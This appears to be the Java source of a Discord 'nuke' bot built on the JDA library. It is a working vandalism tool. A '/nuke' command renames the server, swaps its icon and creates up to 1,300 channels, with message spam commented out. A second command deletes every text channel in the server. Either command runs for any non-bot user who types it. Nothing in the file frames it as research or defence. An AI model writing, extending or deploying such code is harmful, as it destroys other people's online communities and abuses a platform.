package si.f5.stsaria.nuke;

import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URL;
import java.util.List;
import java.util.Scanner;

import javax.imageio.ImageIO;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Icon;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.requests.GatewayIntent;

public class NukeBot extends ListenerAdapter{
	private static JDA jda = null;
	private static String[] SETTINGS = null;
	
	void allChannelDeleteAndCreate(MessageReceivedEvent event) {
		Guild guild = event.getGuild();
		List<TextChannel> channels = guild.getTextChannels();
		for (TextChannel channel : channels) {
			channel.delete().queue();
		}
		guild.createTextChannel(SETTINGS[2]).queue();
	}
	
	void nuke(MessageReceivedEvent event) {
		Guild guild = event.getGuild();
		// 鯖名変更
		guild.getManager().setName(SETTINGS[2]).queue();
		// 鯖アイコンを変える
		try {
			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			URL url = URI.create(SETTINGS[3]).toURL();
			BufferedImage image = ImageIO.read(url);
			ImageIO.write(image, "png", baos);
			byte[] imageBytes = baos.toByteArray();
			guild.getManager().setIcon(Icon.from(imageBytes)).queue();
		} catch (MalformedURLException e) {} catch (IOException e) {}
		List<TextChannel> channels = guild.getTextChannels();
		for (int i = 0; i < 1300; i++) {
			channels.add(guild.createTextChannel(SETTINGS[2]).complete());
			// System.out.println(SETTINGS[1]);
			for (TextChannel channel : channels) {
				// channel.sendMessage(SETTINGS[1]).queue();
			}
		}
	}
	
	public static void main(String[] args) {
		Scanner scanner = new Scanner(System.in);
		System.out.print("Setting File: ");
		String settingsFile = scanner.nextLine();
		scanner.close();
		try(FileInputStream stream = new FileInputStream(settingsFile)){
		    byte[] bytes = stream.readAllBytes();
		    SETTINGS  = new String(bytes).split(",");
		}catch (FileNotFoundException e) {
		    e.printStackTrace();
		    return;
		} catch (IOException e) {
		    e.printStackTrace();
		    return;
		}
		System.out.println(SETTINGS[2]);
		jda = JDABuilder.createDefault(SETTINGS[0])
                .setRawEventsEnabled(true)
                .enableIntents(GatewayIntent.MESSAGE_CONTENT)
                .addEventListeners(new NukeBot())
                .build();

		jda.updateCommands().queue();
	}
	
	@Override
    public void onMessageReceived(MessageReceivedEvent event) {
        if (event.getAuthor().isBot()) {
        	return;
        } 
        switch(event.getMessage().getContentRaw()) {
        case "/nuke":
        	nuke(event);
        	break;
	    case "/allChannelDeleteAndCreate":
	    	allChannelDeleteAndCreate(event);
	    	break;
        }
	}
	@Override
    public void onSlashCommandInteraction(SlashCommandInteractionEvent event) {
	}
}